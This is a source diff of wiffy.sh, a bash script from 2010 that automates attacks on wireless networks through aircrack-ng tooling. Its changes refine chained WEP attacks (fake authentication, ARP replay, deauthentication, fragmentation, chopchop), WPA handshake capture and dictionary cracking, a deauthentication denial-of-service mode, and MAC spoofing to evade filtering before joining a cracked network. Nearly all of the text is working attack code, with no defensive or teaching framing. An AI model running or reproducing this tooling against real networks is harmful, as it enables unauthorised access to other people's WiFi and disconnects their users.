@@ -1,6 +1,6 @@
 #!/bin/bash
 #----------------------------------------------------------------------------------------------#
-#wiffy.sh v0.1 (#26 2010-10-10)                                                                #
+#wiffy.sh v0.1 (#27 2010-10-13)                                                                #
 # (C)opyright 2010 - g0tmi1k                                                                   #
 #---License------------------------------------------------------------------------------------#
 #  This program is free software: you can redistribute it and/or modify it under the terms     #
@@ -54,8 +54,8 @@ benchmark="true"
      displayMore="false"          # Gives more details on whats happening
            debug="false"          # Windows don't close, shows extra stuff
          logFile="wiffy.log"      # Filename of output
-             svn="30"             # SVN Number
-         version="0.1 (#26)"      # Program version
+             svn="31"             # SVN Number
+         version="0.1 (#27)"      # Program version
 trap 'interrupt break' 2          # Captures interrupt signal (Ctrl + C)
 
 #----Functions---------------------------------------------------------------------------------#
@@ -101,6 +101,7 @@ function attack() { #attack mode #$essid $bssid #$mac
          display action "Attack ($1): $4"
          action "$1" "aireplay-ng --fakeauth 0 -e \"$2\" -a $3 -h $4 $monitorInterface | tee /tmp/wiffy.tmp" "true" "0|195|5"
          if grep -q "No such BSSID available" "/tmp/wiffy.tmp" ; then display error "Couldn't detect '$essid'" 1>&2 ;
+         elif grep -q "$monitorInterface is on channel" "/tmp/wiffy.tmp"  ; then display error "Attack ($1): Failed (Channel Error)" 1>&2 ;
          elif grep -q "Association successful" "/tmp/wiffy.tmp" && [ "$displayMore" == "true" ] ; then display info "Attack ($1): Successfully association!" ; fi
          return 0
       elif [ "$1" == "ARPReplay" ] ; then
@@ -115,9 +116,9 @@ function attack() { #attack mode #$essid $bssid #$mac
             if [[ "$encryption" == *WPA* ]] ; then action "$1" "$command" "true" "0|195|5"
             else action "$1" "$command" "true" "0|285|5" ; fi
          else
-            command="aireplay-ng --deauth 10" 
-            if [ "$2" ] ; then command="$command -e \"$2\"" ; fi 
-            command="$command -a $3 $monitorInterface" 
+            command="aireplay-ng --deauth 10"
+            if [ "$2" ] ; then command="$command -e \"$2\"" ; fi
+            command="$command -a $3 $monitorInterface"
             action "$1" "$command" "true" "0|195|5"
          fi
          sleep 1
@@ -127,6 +128,7 @@ function attack() { #attack mode #$essid $bssid #$mac
          action "$1" "aireplay-ng --fragment -b $3 -h $4 -m 100 -F $monitorInterface | tee /tmp/wiffy.tmp" "true" "0|195|5"
          if grep -q "Failure: the access point does not properly discard frames with an" "/tmp/wiffy.tmp" ; then display error "Attack ($1): Failed (1)" 1>&2 ;
          elif grep -q "Failure: got several deauthentication packets from the AP - try running" "/tmp/wiffy.tmp" ; then display error "Attack ($1): Failed (2)" 1>&2 ;
+         elif grep -q "$monitorInterface is on channel" "/tmp/wiffy.tmp"  ; then display error "Attack ($1): Failed (Channel Error)" 1>&2 ;
          elif grep -q "Saving keystream in" "/tmp/wiffy.tmp" ; then
             if [ "$displayMore" == "true" ] ; then display info "Attack ($1): Success!" ; fi
             action "$1" "packetforge-ng -0 -a $3 -h $4 -k 255.255.255.255 -l 255.255.255.255 -y fragment-*.xor -w /tmp/wiffy.arp" "true" "0|195|5"
@@ -139,7 +141,8 @@ function attack() { #attack mode #$essid $bssid #$mac
          action "$1" "aireplay-ng --chopchop -b $3 -h $4 -m 100 -F $monitorInterface | tee /tmp/wiffy.tmp" "true" "0|195|5"
          if grep -q "Failure: the access point does not properly discard frames with an" "/tmp/wiffy.tmp" ; then display error "Attack ($1): Failed (1)" 1>&2 ;
          elif grep -q "Failure: got several deauthentication packets from the AP - try running" "/tmp/wiffy.tmp" ; then display error "Attack ($1): Failed (2)" 1>&2 ;
-         elif grep -q "--arpreplaySaving keystream in" "/tmp/wiffy.tmp" ; then
+         elif grep -q "$monitorInterface is on channel" "/tmp/wiffy.tmp"  ; then display error "Attack ($1): Failed (Channel Error)" 1>&2 ;
+         elif grep -q "Saving keystream in" "/tmp/wiffy.tmp" ; then
             if [ "$displayMore" == "true" ] ; then display info "Attack (ChopChop): Success!" ; fi
             action "$1" "packetforge-ng -0 -a $3 -h $4 -k 192.168.1.100 -l 192.168.1.1 -y fragment-*.xor -w /tmp/wiffy.arp" "true" "0|195|5"
             action "$1" "aireplay-ng --interactive -r /tmp/wiffy.arp -F $monitorInterface" "true" "0|195|5" & # Don't wait, do the next command
@@ -148,7 +151,8 @@ function attack() { #attack mode #$essid $bssid #$mac
          return 0
       elif [ "$1" == "Interactive" ] ; then
          display action "Attack ($1): $client"
-         action "Interactive" "aireplay-ng --interactive -b $3 -c FF:FF:FF:FF:FF:FF -h $4 -T 1 -p 0841 -F $monitorInterface" "true" "0|195|5"
+         action "Interactive" "aireplay-ng --interactive -b $3 -c FF:FF:FF:FF:FF:FF -h $4 -T 1 -p 0841 -F $monitorInterface" "true" "0|195|5" &
+         sleep 1
          return 0
       elif [ "$1" == "DoS" ] ; then
          if [ "$4" ] ; then
@@ -173,8 +177,8 @@ function attack() { #attack mode #$essid $bssid #$mac
 }
 function attackWEP() { #attackWEP
    if [ "$debug" == "true" ] ; then display diag "attackWEP~$@" ; fi
-   stage="attackWEP" 
-   if [ "$stage" == "attackWEP" ] ; then 
+   stage="attackWEP"
+   if [ "$stage" == "attackWEP" ] ; then
       if [ "$client" == "clientless" ] ; then attack "FakeAuth" "$essid" "$bssid" "$mac" ; client="$mac" ; sleep 1 ; fi
       attack "ARPReplay" "$essid" "$bssid" "$client"
       attack "DeAuth" "$essid" "$bssid" "$client"
@@ -182,14 +186,14 @@ function attackWEP() { #attackWEP
       if [ "$displayMore" == "true" ] && [ "$stage" == "attackWEP" ] && [ "$encryption" ] ; then display action "Waiting for IV's increase" ; sleep $timeWEP ; fi
    fi
 
-   
    command=$(cat "/tmp/wiffy-01.csv" | grep $bssid | awk -F "," '{print $11}' | sed 's/ [ ]*//')
    if [ "$command" ] && [ "$command" -lt "100" ] ; then stage="attackWEP"
-   elif [ ! "$command" ] ; then stage="attackWEP" ; fi 
+   elif [ ! "$command" ] ; then stage="attackWEP" ; fi
    if [ "$stage" == "attackWEP" ] && [ "$encryption" ] ; then
       display error "Attack (ARPReplay): Failed" 1>&2
       command=$(ps aux | grep "aireplay-ng" | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line " ; done | awk '{print}')
       if [ -n "$command" ] ; then action "Killing programs" "kill $command" ; fi # Stopping last attack
+      if [ "$client" == "$mac" ] ; then attack "FakeAuth" "$essid" "$bssid" "$client" ; fi
       attack "Fragment" "$essid" "$bssid" "$client"
       if [ "$displayMore" == "true" ] && [ "$stage" == "attackWEP" ] && [ "$encryption" ] ; then display action "Waiting for IV's increase" ; sleep $timeWEP ; fi
    else stage="done" ; return 1
@@ -197,11 +201,12 @@ function attackWEP() { #attackWEP
 
    command=$(cat "/tmp/wiffy-01.csv" | grep $bssid | awk -F "," '{print $11}' | sed 's/ [ ]*//')
    if [ "$command" ] && [ "$command" -lt "100" ] ; then stage="attackWEP"
-   elif [ ! "$command" ] ; then stage="attackWEP" ; fi 
+   elif [ ! "$command" ] ; then stage="attackWEP" ; fi
    if [ "$stage" == "attackWEP" ] && [ "$encryption" ] ; then
       display error "Attack (Fragment): Failed" 1>&2
       command=$(ps aux | grep "aireplay-ng" | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line " ; done | awk '{print}')
       if [ -n "$command" ] ; then action "Killing programs" "kill $command" ; fi # Stopping last attack
+      if [ "$client" == "$mac" ] ; then attack "FakeAuth" "$essid" "$bssid" "$client" ; fi
       attack "ChopChop" "$essid" "$bssid" "$client"
       if [ "$displayMore" == "true" ] && [ "$stage" == "attackWEP" ] && [ "$encryption" ] ; then display action "Waiting for IV's increase" ; sleep $timeWEP ; fi
    else stage="done" ; return 2
@@ -209,11 +214,12 @@ function attackWEP() { #attackWEP
 
    command=$(cat "/tmp/wiffy-01.csv" | grep $bssid | awk -F "," '{print $11}' | sed 's/ [ ]*//')
    if [ "$command" ] && [ "$command" -lt "100" ] ; then stage="attackWEP"
-   elif [ ! "$command" ] ; then stage="attackWEP" ; fi 
+   elif [ ! "$command" ] ; then stage="attackWEP" ; fi
    if [ "$stage" == "attackWEP" ] && [ "$encryption" ] ; then
       display action "Attack (ChopChop): $client"
       command=$(ps aux | grep "aireplay-ng" | awk '!/grep/ && !/awk/ {print $2}' | while read line; do echo -n "$line " ; done | awk '{print}')
       if [ -n "$command" ] ; then action "Killing programs" "kill $command" ; fi # Stopping last attack
+      if [ "$client" == "$mac" ] ; then attack "FakeAuth" "$essid" "$bssid" "$client" ; fi
       attack "Interactive" "$essid" "$bssid" "$client"
       if [ "$displayMore" == "true" ] && [ "$stage" == "attackWEP" ] && [ "$encryption" ] ; then display action "Waiting for IV's increase" ; sleep $timeWEP ; fi
    else stage="done" ; return 3
@@ -221,8 +227,9 @@ function attackWEP() { #attackWEP
 
    command=$(cat "/tmp/wiffy-01.csv" | grep $bssid | awk -F "," '{print $11}' | sed 's/ [ ]*//')
    if [ "$command" ] && [ "$command" -lt "100" ] ; then stage="attackWEP"
-   elif [ ! "$command" ] ; then stage="attackWEP" ; fi 
+   elif [ ! "$command" ] ; then stage="attackWEP" ; fi
    if [ "$stage" == "attackWEP" ] && [ "$encryption" ] ; then display error "Attack (Interactive): Failed" 1>&2 ; fi
+   stage="done"
    return 0
 }
 function attackWPA() { #attackWPA
@@ -232,7 +239,7 @@ function attackWPA() { #attackWPA
    while [ "$stage" == "findClient" ] ; do
       action "aircrack-ng" "aircrack-ng /tmp/wiffy-01.cap -w /tmp/wiffy.tmp -e \"$essid\" | tee /tmp/wiffy.handshake" "true" "0|195|5"
       command=$(cat "/tmp/wiffy.handshake" | grep "Passphrase not in dictionary") ; if [ "$command" ] ; then stage="done" ; fi
-      if [ "$encryption" ] ; then sleep 2 ; fi 
+      if [ "$encryption" ] ; then sleep 2 ; fi
       if [ "$loop" != "1" ] && [ "$encryption" ] && [ "$stage" == "findClient" ] ; then if [ "$loop" == "0" ] ; then display action "Capturing: Handshake" ; else if [ "$encryption" ] ; then findClient $encryption ; fi ; fi ; if [ "$encryption" ] ; then sleep 2 ; fi ; for targets in "${client[@]}" ; do attack "DeAuth" "$essid" "$bssid" "$targets" ; done ; loop="1" # Helping "kick", for idle client(s)
       else attack "DeAuth" "$essid" "$bssid" ; loop="2" ; fi
       if [ "$encryption" ] ; then sleep 3 ; fi
@@ -288,6 +295,7 @@ function capture() { #capture $bssid $channel
 }
 function cleanUp() { #cleanUp #mode
    if [ "$debug" == "true" ] ; then display diag "cleanUp~$@" ; fi
+   stage="cleanUp"
    if [ "$1" == "nonuser" ] ; then exit 3 ;
    elif [ "$1" != "clean" ] && [ "$1" != "remove" ]; then
       echo # Blank line
@@ -321,25 +329,27 @@ function cleanUp() { #cleanUp #mode
       exit 0
    fi
 }
-function connect() { #connect $essid $key #$key
+function connect() { #connect $essid $key $bssid #$client
    if [ "$debug" == "true" ] ; then display diag "connect~$@" ; fi
    error="free"
-   if [ -z "$1" ] || [ -z "$2" ] ; then error="1" ; fi # Coding error
+   if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ] ; then error="1" ; fi # Coding error
    if [ "$error" == "free" ] ; then
-      if [ "$3" != "$mac" ] && [ "$3" ] ; then
-         if [ "$displayMore" == "true" ] ; then display action "Attack (Spoofing): $3 ('Helps' with MAC filtering) " ; fi
-         action "Spoofing MAC" "ifconfig $interface down ; macchanger -m $3 $interface ; ifconfig $interface up"
+      if [ "$4" != "$mac" ] && [ "$4" ] ; then
+         if [ "$displayMore" == "true" ] ; then display action "Attack (Spoofing): $4 ('Helps' with MAC filtering) " ; fi
+         action "Spoofing MAC" "ifconfig $interface down ; macchanger -m $4 $interface ; ifconfig $interface up"
       fi
       display action "Joining: $1"
-      action "Starting services" "/etc/init.d/wicd start ; service network-manager start" # Backtrack & Ubuntu
-      if [ "$encryption" == "WEP" ] ; then
-         action "i[f/w]config" "ifconfig $interface down ; iwconfig $interface essid $1 key $2 ; ifconfig $interface up"
+      action "Joining" " /etc/init.d/wicd start ; service network-manager start" # Backtrack & Ubuntu
+      sleep 1
+      if [ "$encryption" == "Off" ] ; then
+         action "Off" "ifconfig $interface down ; dhclient -r $interface ; ifconfig $interface up ; iwconfig $interface essid \"$1\" ; iwconfig $interface mode Managed ; dhclient $interface"
+      elif [ "$encryption" == "WEP" ] ; then
+         action "WEP" "ifconfig $interface down ; dhclient -r $interface ; ifconfig $interface up ; iwconfig $interface essid \"$1\" ; iwconfig $interface key \"$2\" ; iwconfig $interface mode Managed ; dhclient $interface"
       elif [[ "$encryption" == *WPA* ]] ; then
-         action "WPA" "wpa_passphrase $1 '$2' > /tmp/wiffy.tmp && wpa_supplicant -B -i$interface -c/tmp/wiffy.tmp -Dwext"
+         action "WPA" "ifconfig $interface down ; dhclient -r $interface ; wpa_passphrase $1 '$2' > /tmp/wiffy.tmp && wpa_supplicant -B -i$interface -c/tmp/wiffy.tmp -Dwext ; dhclient $interface"
          cp -f "/tmp/wiffy.tmp" "wpa.conf"
       fi
       sleep 5
-      action "IP Addresss" "ifconfig $interface 0.0.0.0 ; dhclient $interface"
       ourIP=$(ifconfig $interface | awk '/inet addr/ {split ($2,A,":"); print A[2]}')
       if [ "$ourIP" ] ; then if [ "$displayMore" == "true" ] ; then display info "IP: $ourIP" ; fi ; display action "Connected!" ; stage="connected";
       else display error "Failed to get an IP address!" 1>&2 ; fi
@@ -383,6 +393,7 @@ function findAP() { #findAP
    if [ "$debug" == "true" ] ; then display diag "findAP~$@" ; fi
    while true ; do
       capture && sleep $timeScan && action "Restarting" "killall xterm"
+      if [ ! -e "/tmp/wiffy-01.kismet.netxml" ] ; then display error "Something went wrong )=" 1>&2 ; cleanUp ; fi
       index="-1" # so its starts at 0
       id="" # For -e or -b
       while IFS='<>' read _ starttag value endtag; do
@@ -441,7 +452,7 @@ function findAP() { #findAP
             read -p "[~] re[s]can, e[x]it or select num: "
             if [ "$REPLY" == "x" ] ; then cleanUp clean
             #elif [ "$REPLY" == "a" ] ; then mode="all" ; loopSelect="true" ; loopSearch="true"
-            elif [ "$REPLY" == "s" ] ; then break ;
+            elif [ "$REPLY" == "s" ] ; then essid="" ; bssid="" ; id="" ; encryption="" ; client="" ; break
             elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]'l) ] ; then display error "Bad input" 1>&2
             elif [ "$REPLY" -lt "1" ] || [ "$REPLY" -gt "$loop" ] ; then display error "Incorrect number" 1>&2
             else id="$(($REPLY-1))" ; break 2 ; fi
@@ -472,6 +483,10 @@ function findAP() { #findAP
 \e[01;33m[i]\e[00m       encryption=$encryption
 \e[01;33m[i]\e[00m          channel=$channel"
    fi
+
+   if [ "$displayMore" == "true" ] ; then display action "Configuring: Wireless card" ; fi
+   action "Changing Channel" "iwconfig $monitorInterface channel $channel" "true"
+
    stage="findAP"
 }
 function findClient() { #findClient $encryption
@@ -490,17 +505,17 @@ function findClient() { #findClient $encryption
          if [ "$timeWPA" == "0" ] ; then while [ -z "$client" ] ; do client=( $(cat "/tmp/wiffy-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/') ) ; done
          else for ((i=0;i<$timeWPA;i++)); do client=( $(cat "/tmp/wiffy-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/') ) ; sleep 1 ; if [ -n "$client" ] ; then i=$timeWPA ; fi ; done ; fi
       fi
-      
+
       if [ -z "$essid" ] && [ "$encryption" ] ; then
          essid=$(cat "/tmp/wiffy-01.kismet.netxml" | grep "<essid cloaked=\"false\">" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/')
          if [ "$essid" ] && [ "$displayMore" == "true" ] ; then display info "*hidden* ESSID=$essid" ; fi
       fi
-      
+
       if [ -z "$essid" ] && [ "$encryption" ] && [ "$mode" != "dos" ] ; then
          action "Restarting" "killall xterm"
          display error "Timed out. Couldn't detect SSID. Try increasing \"timeWxx\"?" 1>&2
          interrupt
-      fi      
+      fi
 
       if [ -z "$client" ] && [ "$1" ] ; then
          if [[ "$1" == *WPA* ]] && [ "$mode" != "dos" ] ; then action "Restarting" "killall xterm"  ; display error "Timed out. Couldn't find a connected client to '$essid'. Try increasing \"timeWPA\"?" 1>&2 ; interrupt ; fi
@@ -563,7 +578,7 @@ function help() { #help
           + Re-run the script
        > IV's doesn't increae
           + WiFi card isn't support
-          + DeAuth didn't work 
+          + DeAuth didn't work
           + Use a different router/client
 
     -WPA
@@ -588,18 +603,20 @@ function help() { #help
    exit 1
 }
 function interrupt() { #interrupt
-   if [ "$mode" == "crack" ] && ( [ "$stage" == "attackWEP" ] || [ "$stage" == "capture" ] ) && [ "$encryption" == "WEP" ]; then 
+   if [ "$stage" == "cleanUp" ] ; then
+      echo #Blank line
+   elif [ "$mode" == "crack" ] && ( [ "$stage" == "attackWEP" ] || [ "$stage" == "capture" ] ) && [ "$encryption" == "WEP" ]; then
       echo #Blank line
       read -p "[~] [N]ext attack, select [a]nother network or anything else to exit: "
       if [[ "$REPLY" =~ ^[Nn]$ ]] ; then command=$(pgrep aireplay-ng | while read line; do echo -n "$line " ; done | awk '{print}') ; if [ -n "$command" ] ; then kill $command ; fi ; if [ ! $(pgrep airodump-ng) ] ; then capture "$bssid" "$channel" ; fi
       elif [[ "$REPLY" =~ ^[Aa]$ ]] ; then action "Restarting" "killall xterm" ; stage="interrupt" ; essid="" ; bssid="" ; id="" ; encryption="" ; client="" ; break # reset
       else cleanUp interrupt ; fi # Default
-   elif [ "$mode" == "crack" ] && [ "$stage" != "setup" ] && [ "$stage" != "menu" ] && [ "$stage" != "done" ] ; then
+   elif [ "$mode" == "crack" ] && [ "$stage" != "setup" ] && [ "$stage" != "menu" ] && [ "$stage" != "capture" ] && [ "$stage" != "done" ] ; then
       echo #Blank line
       #read -p "[~] Select [a]nother network or anything else to exit: "
       #if [[ "$REPLY" =~ ^[Aa]$ ]] ; then ...
       #else cleanUp interrupt ; fi # Default
-      action "Restarting" "killall xterm" ; essid="" ; bssid="" ; id="" ; encryption="" ; client="" ; break 
+      action "Restarting" "killall xterm" ; essid="" ; bssid="" ; id="" ; encryption="" ; client="" ; break
    else
       cleanUp interrupt
    fi
@@ -633,16 +650,16 @@ function testAP() { #testAP $bssid $encryption #$essid
    if [ "$error" == "free" ] ; then
       if [ -e "wiffy.keys" ] ; then
          if [ -z "$3" ] ; then # Hidden SSID
-            tmp=$(cat wiffy.keys | sed -n "/BSSID: $1/, +3p")
+            tmp=$(cat wiffy.keys | sed -n "/BSSID: $1/, +3p" | head -5)
             key=$(echo $tmp | grep "Encryption: $2" -q && echo $tmp | sed -n 's/.*Key: //p' | sed -n 's/ Client: .*//p')
-            if [ "$key" ] ; then 
+            if [ "$key" ] ; then
                command=$(grep -n "BSSID: $1" wiffy.keys | cut -f1 -d: | head -1)
                essidTMP=$(cat wiffy.keys | sed -n $((command-1))p | sed -n 's/.*ESSID: //p')
                if [ "$essidTMP" ] ; then display info "essid *may* be: $essidTMP" ; fi
             fi
          else
-            tmp=$(cat wiffy.keys | sed -n "/ESSID: $3/, +4p")
-            key=$(echo $tmp | grep "BSSID: $1" -q  && echo $tmp | grep "Encryption: $2" -q && echo $tmp | sed -n 's/.*Key: //p' | sed -n 's/ Client: .*//p')         
+            tmp=$(cat wiffy.keys | sed -n "/ESSID: $3/, +4p" | head -5)
+            key=$(echo $tmp | grep "BSSID: $1" -q  && echo $tmp | grep "Encryption: $2" -q && echo $tmp | sed -n 's/.*Key: //p' | sed -n 's/ Client: .*//p')
             essidTMP="$essid"
          fi
          if [ "$essidTMP" ] && [ "$key" ] ; then
@@ -650,9 +667,9 @@ function testAP() { #testAP $bssid $encryption #$essid
             #read -p "[~] Try and connect with it? [Y/n]: "
             #if [[ "$REPLY" =~ ^[Nn]$ ]] ; then return 1
             #else connect "$essidTMP" "$key" "$client" ; fi
-            if [ "$connect" == "true" ] ; then 
+            if [ "$connect" == "true" ] ; then
                client=$(echo $tmp | grep "BSSID: $2" -q  && echo $tmp | grep "Encryption: $3" -q && echo $tmp | sed -n 's/.*Client: //p')
-               connect "$essidTMP" "$key" "$client"
+               connect "$essidTMP" "$key" "$bssid" "$client"
                if [ "$stage" == "connected" ] ; then cleanUp clean ; fi
             fi
          fi
@@ -831,7 +848,7 @@ fi
 #----------------------------------------------------------------------------------------------#
 if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
    display error "aircrack-ng isn't installed" 1>&2
-   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
+   read -p "[~] Would you like to try and install it? [Y/n]: "
    if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install aircrack-ng" "apt-get -y install aircrack-ng" ; fi
    if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
       display error "Failed to install aircrack-ng" 1>&2 ; cleanUp
@@ -841,7 +858,7 @@ if [ ! -e "/usr/sbin/airmon-ng" ] && [ ! -e "/usr/local/sbin/airmon-ng" ] ; then
 fi
 if [ ! -e "/usr/bin/macchanger" ] ; then
    display error "macchanger isn't installed"
-   read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
+   read -p "[~] Would you like to try and install it? [Y/n]: "
    if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install macchanger" "apt-get -y install macchanger" ; fi
    if [ ! -e "/usr/bin/macchanger" ] ; then
       display error "Failed to install macchanger" 1>&2 ; cleanUp
@@ -852,7 +869,7 @@ fi
 if [ "$mode" == "inject" ] ; then
    if [ ! -e "/pentest/wireless/airpwn-1.4/airpwn" ] ; then
       display error "airpwn isn't installed"
-      read -p "[~] Would you like to try and install it? [Y/n]: " -n 1
+      read -p "[~] Would you like to try and install it? [Y/n]: "
       if [[ "$REPLY" =~ ^[Yy]$ ]] ; then action "Install airpwn" "apt-get -y install libnet1-dev libpcap-dev python2.4-dev libpcre3-dev libssl-dev" ; fi
       action "Install airpwn" "wget -P /tmp http://downloads.sourceforge.net/project/airpwn/airpwn/1.4/airpwn-1.4.tgz && tar -C /pentest/wireless -xvf /tmp/airpwn-1.4.tgz && rm /tmp/airpwn-1.4.tgz"
       find="#ifndef _LINUX_WIRELESS_H"
@@ -932,7 +949,7 @@ if [ "$mode" == "crack" ] ; then
          elif [[ "$encryption" == *WPA* ]] && ( [ "$stage" == "capture" ] || [ "$stage" == "findClient" ] ) ; then attackWPA ; fi
       done
    done
-   if [ "$stage" != "done" ] || [ "$essid" == "" ] || [ "$bssid" == "" ] || [ "$encryption" == "" ] ; then display error "Something went wrong )=    (1)" 1>&2 ; cleanUp ; fi
+   if [ "$stage" != "done" ] || [ "$essid" == "" ] || [ "$bssid" == "" ] || [ "$encryption" == "" ] ; then display error "Something went wrong )=" 1>&2 ; cleanUp ; fi
 
    #----------------------------------------------------------------------------------------------#
    moveCap "$essid"
@@ -949,10 +966,10 @@ if [ "$mode" == "crack" ] ; then
    action "Closing programs" "killall xterm ; airmon-ng stop $monitorInterface ; sleep 2" # Sleep = Make sure aircrack-ng has saved file.
 
    #----------------------------------------------------------------------------------------------#
-   if [ -e "/tmp/wiffy.keys" ] ; then key=$(cat "/tmp/wiffy.keys") ;  display info "WiFi key: $key" ;  echo -e "---------------------------------------\n      Date: $(date)\n     ESSID: $essid\n     BSSID: $bssid\nEncryption: $encryption\n       Key: $key\n    Client: $client" >> "wiffy.keys" ; if [ "$connect" == "true" ] ; then connect "$essid" "$key" "$client"; fi
+   if [ -e "/tmp/wiffy.keys" ] ; then key=$(cat "/tmp/wiffy.keys") ;  display info "WiFi key: $key" ;  echo -e "---------------------------------------\n      Date: $(date)\n     ESSID: $essid\n     BSSID: $bssid\nEncryption: $encryption\n       Key: $key\n    Client: $client" >> "wiffy.keys" ; if [ "$connect" == "true" ] ; then connect "$essid" "$key" "$bssid" "$client"; fi
    elif [[ "$encryption" == *WPA* ]] && [ -e "$wordlist" ] ; then display error "WPA: WiFi key isn't in the wordlist" 1>&2
    elif [ "$encryption" == "WEP" ] ; then display error "WEP: Couldn't inject" 1>&2
-   elif [ "$encryption" != "N/A" ] ; then display error "Something went wrong )=    (2)" 1>&2 ; fi
+   elif [ "$encryption" != "N/A" ] ; then display error "Something went wrong )=" 1>&2 ; fi
 #----------------------------------------------------------------------------------------------#
 elif [ "$mode" == "dos" ] ; then
    findAP
@@ -960,7 +977,7 @@ elif [ "$mode" == "dos" ] ; then
       capture $bssid $channel
 
       findClient $encryption
-      action "Restarting" "killall xterm" 
+      action "Restarting" "killall xterm"
 
       echo -e " Num |         MAC       \n-----|-------------------"
       loop=${#client[@]}
@@ -974,7 +991,7 @@ elif [ "$mode" == "dos" ] ; then
       while true ; do
          read -p "[~] Select [a]nother network, re[s]can clients, e[x]it or select num: "
          if [ "$REPLY" == "x" ] ; then cleanUp clean
-         elif [ "$REPLY" == "s" ] ; then break ;
+         elif [ "$REPLY" == "s" ] ; then essid="" ; bssid="" ; break ;
          elif [ "$REPLY" == "a" ] ; then essid="" ; bssid="" ; findAP ; break ;
          elif [ -z $(echo "$REPLY" | tr -dc '[:digit:]'l) ] ; then display error "Bad input" 1>&2
          elif [ ${client[0]} == "clientless" ] && [ "$REPLY" != "1" ] ; then display error "Incorrect number" 1>&2
@@ -982,9 +999,6 @@ elif [ "$mode" == "dos" ] ; then
          else id="$(($REPLY-1))" ; break 2 ; fi
        done
    done
-
-   if [ "$displayMore" == "true" ] ; then display action "Configuring: Wireless card" ; fi
-   action "Changing Channel" "iwconfig $monitorInterface channel $channel" "true"
 
    display action "Attack (DoS): $essid"
    if [ ${client[0]} == "clientless" ] || [ "$REPLY" == $(($loop+2)) ] ; then attack "DoS" "$essid" "$bssid" "$targets" & sleep 1
@@ -1028,6 +1042,7 @@ cleanUp clean
 # Auto - Auto "all" crack (All [W]EP, all W[P]A, [A]ll)
 # All - Check running processors - if not running, cleanUp
 # "AP-Less" ?
+# Remove Dups BBSIDs, ESSID, Encryption & Channel
 #----------------------------------------------------------------------------------------------#
    #echo $wordlist > $wordlist
    #airolib-ng /tmp/wiffy-$essid.hash --import essid /tmp/wiffy.tmp
